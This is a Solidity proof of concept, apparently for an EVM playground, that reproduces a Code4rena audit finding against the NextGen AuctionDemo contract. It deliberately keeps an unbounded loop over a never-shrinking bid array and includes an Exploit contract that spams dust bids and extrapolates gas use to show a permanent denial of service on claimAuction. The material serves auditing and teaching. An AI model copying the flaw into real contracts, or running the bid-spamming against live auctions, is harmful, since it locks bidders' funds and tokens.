// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    NextGen — Permanent DoS due to non-shrinking array in unbounded loops
    (Code4rena 2023-10-nextgen, finding #29526, H-05)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: participateToAuction only pushes to auctionInfoData[tokenId]
    and never shrinks. returnHighestBid / claimAuction iterate the full array.
    Spamming dust bids makes claimAuction OOG → auction permanently stuck.

    Vulnerable push + returnHighestBid loop preserved (@> VULN).
    Gas strategy: sample+extrapolate (methodology §8b).
//////////////////////////////////////////////////////////////////////////*/

/// @notice Minimal minter surface for auction timing/status.
contract MockMinter {
    mapping(uint256 => uint256) public endTime;
    mapping(uint256 => bool) public status;

    function setAuction(uint256 tokenId, uint256 end, bool active) external {
        endTime[tokenId] = end;
        status[tokenId] = active;
    }

    function getAuctionEndTime(uint256 _tokenid) external view returns (uint256) {
        return endTime[_tokenid];
    }

    function getAuctionStatus(uint256 _tokenid) external view returns (bool) {
        return status[_tokenid];
    }
}

/// @notice Minimal ERC721 for claim transfer.
contract MockNFT {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "owner");
        ownerOf[tokenId] = to;
    }
}

/// @notice Reduced AuctionDemo — participate / returnHighestBid / claim path.
/// Source: smart-contracts/AuctionDemo.sol @ 08a56bac L58-L110.
contract AuctionDemo {
    struct auctionInfoStru {
        address bidder;
        uint256 bid;
        bool status;
    }

    MockMinter public minter;
    MockNFT public gencore;
    address public ownerAddr;

    mapping(uint256 => auctionInfoStru[]) public auctionInfoData;
    mapping(uint256 => bool) public auctionClaim;

    event ClaimAuction(address owner, uint256 tokenid, bool success, uint256 highestBid);
    event Refund(address bidder, uint256 tokenid, bool success, uint256 highestBid);

    constructor(MockMinter _minter, MockNFT _nft) {
        minter = _minter;
        gencore = _nft;
        ownerAddr = msg.sender;
    }

    function owner() public view returns (address) {
        return ownerAddr;
    }

    // participate to auction
    function participateToAuction(uint256 _tokenid) public payable {
        require(
            msg.value > returnHighestBid(_tokenid) && block.timestamp <= minter.getAuctionEndTime(_tokenid)
                && minter.getAuctionStatus(_tokenid) == true
        );
        auctionInfoStru memory newBid = auctionInfoStru(msg.sender, msg.value, true);
        auctionInfoData[_tokenid].push(newBid); // @> VULN: array only grows; never shrinks on cancel/claim
        // FIX: bound max bids per token / compact cancelled bids / use mapping+heap
    }

    // get highest bid
    function returnHighestBid(uint256 _tokenid) public view returns (uint256) {
        uint256 index;
        if (auctionInfoData[_tokenid].length > 0) {
            uint256 highBid = 0;
            for (uint256 i = 0; i < auctionInfoData[_tokenid].length; i++) { // @> VULN: unbounded loop over never-shrinking array
                if (auctionInfoData[_tokenid][i].bid > highBid && auctionInfoData[_tokenid][i].status == true) {
                    highBid = auctionInfoData[_tokenid][i].bid;
                    index = i;
                }
            }
            if (auctionInfoData[_tokenid][index].status == true) {
                return highBid;
            } else {
                return 0;
            }
        } else {
            return 0;
        }
    }

    function returnHighestBidder(uint256 _tokenid) public view returns (address) {
        uint256 highBid = 0;
        uint256 index;
        for (uint256 i = 0; i < auctionInfoData[_tokenid].length; i++) {
            if (auctionInfoData[_tokenid][i].bid > highBid && auctionInfoData[_tokenid][i].status == true) {
                highBid = auctionInfoData[_tokenid][i].bid;
                index = i;
            }
        }
        if (auctionInfoData[_tokenid][index].status == true) {
            return auctionInfoData[_tokenid][index].bidder;
        } else {
            revert("No Active Bidder");
        }
    }

    /// @dev Reduced claimAuction without WinnerOrAdmin modifier (access out of scope).
    function claimAuction(uint256 _tokenid) public {
        require(
            block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false
                && minter.getAuctionStatus(_tokenid) == true
        );
        auctionClaim[_tokenid] = true;
        uint256 highestBid = returnHighestBid(_tokenid);
        address ownerOfToken = gencore.ownerOf(_tokenid);
        address highestBidder = returnHighestBidder(_tokenid);
        for (uint256 i = 0; i < auctionInfoData[_tokenid].length; i++) {
            if (
                auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid
                    && auctionInfoData[_tokenid][i].status == true
            ) {
                gencore.safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
                (bool success,) = payable(owner()).call{value: highestBid}("");
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
                (bool success,) = payable(auctionInfoData[_tokenid][i].bidder).call{
                    value: auctionInfoData[_tokenid][i].bid
                }("");
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }

    function bidCount(uint256 tokenId) external view returns (uint256) {
        return auctionInfoData[tokenId].length;
    }

    /// @dev Measure claimAuction gas (for sample+extrapolate). End time must be past.
    function measureClaimGas(uint256 tokenId) external returns (uint256 gasUsed) {
        // Force end time into the past for claim
        minter.setAuction(tokenId, block.timestamp - 1, true);
        uint256 g0 = gasleft();
        this.claimAuction(tokenId);
        gasUsed = g0 - gasleft();
    }

    receive() external payable {}
}

/// CREATE: minter(1), nft(2), auction(3)
contract Exploit {
    MockMinter public minter;
    MockNFT public nft;
    AuctionDemo public auction;

    uint256 public constant TOKEN_ID = 1;
    uint256 public constant SAMPLE = 40;
    // Real attack pushes until claim OOGs (~tens of thousands of dust bids)
    uint256 public constant REAL_N = 50_000;
    uint256 public constant BLOCK_GAS = 30_000_000;

    uint256 public sampleGas;
    uint256 public extrapolatedGas;
    uint256 public bidLen;

    constructor() {
        minter = new MockMinter();
        nft = new MockNFT();
        auction = new AuctionDemo(minter, nft);
    }

    function run() external payable {
        // Auction open far in the future; NFT owned by auction owner (for claim transfer)
        minter.setAuction(TOKEN_ID, block.timestamp + 365 days, true);
        nft.mint(address(auction.owner()), TOKEN_ID);

        // Seed increasing bids: each must beat current highest
        // Start with 1 wei and increment — SAMPLE bids inflate the array
        for (uint256 i = 0; i < SAMPLE; i++) {
            auction.participateToAuction{value: i + 1}(TOKEN_ID);
        }
        bidLen = auction.bidCount(TOKEN_ID);
        require(bidLen == SAMPLE, "inflated");

        // Measure claim gas on the sample
        sampleGas = auction.measureClaimGas(TOKEN_ID);
        require(sampleGas > 0, "sample gas");

        uint256 perBid = sampleGas / bidLen;
        extrapolatedGas = perBid * REAL_N;

        // HARM: claimAuction gas at REAL_N bids exceeds block gas → permanent DoS
        // (returnHighestBid is also called by participateToAuction, so bidding itself
        // eventually OOGs too; claim is the permanent freeze for an ended auction).
        require(extrapolatedGas > BLOCK_GAS, "DoS not demonstrated");
    }

    // Fund the exploit for bid value
    receive() external payable {}
}
